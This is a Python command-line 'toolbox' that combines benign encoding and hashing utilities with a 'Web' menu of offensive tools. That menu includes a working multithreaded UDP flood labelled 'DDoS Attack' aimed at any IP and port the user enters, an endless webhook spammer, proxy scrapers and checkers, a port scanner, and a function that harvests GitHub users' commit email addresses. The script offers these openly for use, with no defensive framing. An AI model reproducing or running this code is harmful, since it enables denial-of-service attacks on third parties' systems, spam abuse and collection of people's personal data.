import os
import sys
from time import sleep

os.system('cls' if os.name == 'nt' else 'clear')

dependencies = ["requests", "pyperclip"]

JAUNE = "\033[33m"
ROUGE = "\033[31m"
VERT = "\033[32m"
VIOLET = "\033[35m"  
RESET = "\033[0m"   

def check_dependencies():
    missing_dependencies = []
    for dependency in dependencies:
        try:
            __import__(dependency)
            print(f"{VERT}Dependency {dependency} is installed.{RESET}")
            sleep(1)
        except ImportError:
            missing_dependencies.append(dependency)
    
    if missing_dependencies:
        for dependency in missing_dependencies:
            print(f"{ROUGE}Dependency {dependency} is not installed.{RESET}")
            sleep(1)
        return False
    return True

print(f"{JAUNE}Checking dependencies...{RESET}")
sleep(1.5)


if not check_dependencies():
    for dependency in dependencies:
        print(f"Installing {dependency}...")
        sleep(1)
        os.system(f"pip install {dependency}")
        print(f"{VERT}{dependency} installed.{RESET}")
        sleep(2)

import requests
import pyperclip
import time
import json
import random
import string
import threading
import socket
import base64
import hashlib
import urllib.parse

def check_internet():
    try:
        requests.get('https://www.google.com')
        return True
    except:
        return False
os.system('cls' if os.name == 'nt' else 'clear')
print(f'{JAUNE}Checking internet connection...{RESET}')
sleep(2)

if not check_internet():
    print(f'{ROUGE}No internet connection. Exiting...{RESET}')
    sleep(2)
    
    sys.exit()
else:
    print(f'{VERT}Internet connection detected. Loading...{RESET}')
    sleep(2)


ascii_art = r""" 
  ___    ___ ___  ___  ________  _______   ___  _________  ________  ________  ___       ________      
 |\  \  /  /|\  \|\  \|\   __  \|\  ___ \ |\  \|\___   ___\\   __  \|\   __  \|\  \     |\   ____\     
 \ \  \/  / | \  \\\  \ \  \|\  \ \   __/|\ \  \|___ \  \_\ \  \|\  \ \  \|\  \ \  \    \ \  \___|_    
  \ \    / / \ \  \\\  \ \   _  _\ \  \_|/_\ \  \   \ \  \ \ \  \\\  \ \  \\\  \ \  \    \ \_____  \   
   \/  /  /   \ \  \\\  \ \  \\  \\ \  \_|\ \ \  \   \ \  \ \ \  \\\  \ \  \\\  \ \  \____\|____|\  \  
 __/  / /      \ \_______\ \__\\ _\\ \_______\ \__\   \ \__\ \ \_______\ \_______\ \_______\____\_\  \ 
|\___/ /        \|_______|\|__|\|__|\|_______|\|__|    \|__|  \|_______|\|_______|\|_______|\_________\
\|___|/                                                                                    \|_________| 
by YureiNox --> https://github.com/yudaol"""

log_file_path = "app.log"  
os.system('cls' if os.name == 'nt' else 'clear')
def log_message(message):
    """Enregistre un message dans le fichier de log."""
    with open(log_file_path, "a") as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(VIOLET + ascii_art + RESET)
    if not check_internet():
        print(f'{RESET}Internet connection status: {ROUGE}Not Connected!{RESET}')
    else:
        print(f'{RESET}Internet connection status: {VERT}Connected !{RESET}')
    print(''' 
    [1] Tools 
    [2] Web 
    [3] Save Log
    [4] Exit''')

    choice = input('Select an option: ')

    if choice == '1':
        os.system('cls' if os.name == 'nt' else 'clear')
        TOOLS()
    elif choice == '2':
        os.system('cls' if os.name == 'nt' else 'clear')
        WEB()
    elif choice == '3':
        save_log()
    elif choice == '4':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Exiting...')
        sys.exit()

def save_log():
    """Sauvegarde les logs dans un fichier."""
    message = input("Enter the message to log: ")
    log_message(message)
    print(f"Message logged: {message}")
    input("Press Enter to exit...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def TOOLS():
    while True: 
        print(VIOLET + ascii_art + RESET)
        if not check_internet():
            print(f'{RESET}Internet connection status: {ROUGE}Not Connected!{RESET}')
        else:
            print(f'{RESET}Internet connection status: {VERT}Connected !{RESET}') 
        print(''' 
        [1] Base64 Encoder 
        [2] Base64 Decoder 
        [3] Hasher (MD5, SHA-1, SHA-256) 
        [4] URL Encoder 
        [5] URL Decoder 
        [6] String Generator 
        [7] String Reverser 
        [8] Back 
        ''')

        choice = input('Select a tool: ')

        if choice == '1':
            text = input('Enter text to encode in Base64: ')
            encoded = base64.b64encode(text.encode()).decode()
            print(f'Encoded text: {encoded}')
            pyperclip.copy(encoded)  
            print('Encoded text copied to clipboard.')
            log_message(f"Encoded text: {encoded}")  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '2':
            encoded_text = input('Enter Base64 text to decode: ')
            try:
                decoded = base64.b64decode(encoded_text).decode()
                print(f'Decoded text: {decoded}')
                pyperclip.copy(decoded)  
                print('Decoded text copied to clipboard.')
                log_message(f"Decoded text: {decoded}")  
            except Exception as e:
                print(f'Error decoding: {e}')
                log_message(f'Error decoding: {e}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '3':
            text = input('Enter text to hash: ')
            print('Choose hashing algorithm:')
            print('[1] MD5\n[2] SHA-1\n[3] SHA-256')
            hash_choice = input('Select an option: ')

            if hash_choice == '1':
                result = hashlib.md5(text.encode()).hexdigest()
            elif hash_choice == '2':
                result = hashlib.sha1(text.encode()).hexdigest()
            elif hash_choice == '3':
                result = hashlib.sha256(text.encode()).hexdigest()
            else:
                print('Invalid choice.')
                continue
            
            print(f'Hashed text: {result}')
            pyperclip.copy(result)  
            print('Hashed text copied to clipboard.')
            log_message(f'Hashed text: {result}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '4':
            url = input('Enter URL to encode: ')
            encoded_url = urllib.parse.quote(url)
            print(f'Encoded URL: {encoded_url}')
            pyperclip.copy(encoded_url)  
            print('Encoded URL copied to clipboard.')
            log_message(f'Encoded URL: {encoded_url}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '5':
            url = input('Enter URL to decode: ')
            decoded_url = urllib.parse.unquote(url)
            print(f'Decoded URL: {decoded_url}')
            pyperclip.copy(decoded_url)  
            print('Decoded URL copied to clipboard.')
            log_message(f'Decoded URL: {decoded_url}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '6':
            length = int(input('Enter the length of the random string: '))
            characters = string.ascii_letters + string.digits
            random_string = ''.join(random.choice(characters) for i in range(length))
            print(f'Generated string: {random_string}')
            pyperclip.copy(random_string)  
            print('Generated string copied to clipboard.')
            log_message(f'Generated string: {random_string}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '7':
            text = input('Enter text to reverse: ')
            reversed_text = text[::-1]
            print(f'Reversed text: {reversed_text}')
            pyperclip.copy(reversed_text)  
            print('Reversed text copied to clipboard.')
            log_message(f'Reversed text: {reversed_text}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  
        
        elif choice == '8':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
            break
        else:
            print('Invalid choice, please try again.')

def WEB():
    while True:  
        print(VIOLET + ascii_art + RESET)
        if not check_internet():
            print(f'{RESET}Internet connection status: {ROUGE}Not Connected!{RESET}')
        else:
            print(f'{RESET}Internet connection status: {VERT}Connected !{RESET}')
        print(''' 
        [1] IP Lookup 
        [2] Port Scanner 
        [3] DDoS Attack 
        [4] Webhook Spammer 
        [5] Proxy Scraper 
        [6] Proxy Checker 
        [7] Proxy Scraper & Checker 
        [8] Proxy Checker & Scraper 
        [9] Proxy Checker & Scraper (Multithreaded) 
        [10] Proxy Scraper (Multithreaded) 
        [11] Proxy Checker (Multithreaded) 
        [12] Proxy Scraper & Checker (Multithreaded) 
        [13] Email Github Catcher
        [14] Back''')

        choice = input('Select an option: ')

        if choice == '1':
            iplookup()
        elif choice == '2':
            portscan()
        elif choice == '3':
            ddos()
        elif choice == '4':
            webhookspammer()
        elif choice == '5':
            proxyscraper()
        elif choice == '6':
            proxychecker()
        elif choice == '7':
            proxyscraperandchecker()
        elif choice == '8':
            proxycheckerandscraper()
        elif choice == '9':
            proxycheckerandscrapermt()
        elif choice == '10':
            proxyscrapermt()
        elif choice == '11':
            proxycheckermt()
        elif choice == '12':
            proxycheckerandscrapermt()
        elif choice == '13':
            emailgithubcatcher()
        elif choice == '14':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
            return  
        else:
            print('Invalid choice. Please try again.')
    
def iplookup():
    ip = input('Enter an IP address to look up: ')
    response = requests.get(f'http://ip-api.com/json/{ip}')
    data = response.json()
    print(json.dumps(data, indent=4))
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def portscan():
    ip = input('Enter IP address to scan: ')
    start_port = int(input('Enter start port: '))
    end_port = int(input('Enter end port: '))
    
    print(f'Scanning ports {start_port} to {end_port} on {ip}...')
    for port in range(start_port, end_port + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((ip, port))
        if result == 0:
            print(f'Port {port} is open')
        s.close()
    
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def ddos():
    ip = input('Enter the target IP address: ')
    port = int(input('Enter the target port: '))
    threads = int(input('Enter number of threads: '))

    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip, port))
            s.sendto(os.urandom(1024), (ip, port))
            print(f'Sent packet to {ip}:{port}')

    for i in range(threads):
        t = threading.Thread(target=attack)
        t.start()

    input("Press Enter to return to the main menu...") 
    os.system('cls' if os.name == 'nt' else 'clear') 

def webhookspammer():
    url = input('Enter your webhook URL: ')
    message = input('Enter your message: ')
    while True:
        requests.post(url, json={"content": message})
        print('Message sent.')

def proxyscraper():
    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')
    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxychecker():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    for proxy in proxies:
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')
    
    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxyscraperandchecker():
    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')

    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    for proxy in proxies:
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxycheckerandscraper():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    for proxy in proxies:
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def proxycheckerandscrapermt():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    def check(proxy):
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    for proxy in proxies:
        threading.Thread(target=check, args=(proxy,)).start()

    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def proxyscrapermt():
    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')

    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    def check(proxy):
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    for proxy in proxies:
        threading.Thread(target=check, args=(proxy,)).start()

    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxycheckermt():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    def check(proxy):
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    for proxy in proxies:
        threading.Thread(target=check, args=(proxy,)).start()

    input("Press Enter to return to the main menu...") 
    os.system('cls' if os.name == 'nt' else 'clear') 

def emailgithubcatcher():
    lka = input('Enter account pseudo: ')
    api_url_base = f"https://api.github.com/users/{lka}/events/public"

    response = requests.get(api_url_base)
    if response.status_code == 200:
        data = response.json()
        emails = []
       
        for event in data:
            if 'payload' in event and 'commits' in event['payload']:
                for commit in event['payload']['commits']:
                    if 'author' in commit and 'email' in commit['author']:
                        emails.append(commit['author']['email'])
       
        if emails:
            print("Emails trouvés :")
            for email in set(emails):  
                print(email)
        else:
            print("Aucun email trouvé.")
    else:
        print('Error fetching data')

    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main()
